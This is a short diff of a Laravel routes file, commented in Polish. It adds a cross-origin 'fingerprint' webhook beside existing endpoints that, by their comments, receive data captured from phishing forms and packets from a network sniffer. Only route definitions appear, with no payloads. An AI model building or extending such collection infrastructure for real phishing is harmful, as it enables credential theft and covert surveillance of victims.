@@ -16,11 +16,13 @@ use Illuminate\Support\Facades\Route;
 
 // Preflight CORS (dla POST z innych domen)
 Route::options('/webhook/capture', [WebhookController::class, 'options']);
+Route::options('/webhook/fingerprint', [WebhookController::class, 'options']);
 Route::options('/webhook/packet',  [WebhookController::class, 'options']);
 Route::options('/live-feed',       [WebhookController::class, 'options']);
 
 // === AEGIS — Przechwytywanie danych z formularzy phishingowych ===
 Route::post('/webhook/capture', [WebhookController::class, 'capture']);
+Route::post('/webhook/fingerprint', [WebhookController::class, 'fingerprint']);
 
 // === NODE — Przechwytywanie pakietów sieciowych ze sniffera ===
 Route::post('/webhook/packet', [WebhookController::class, 'packet']);
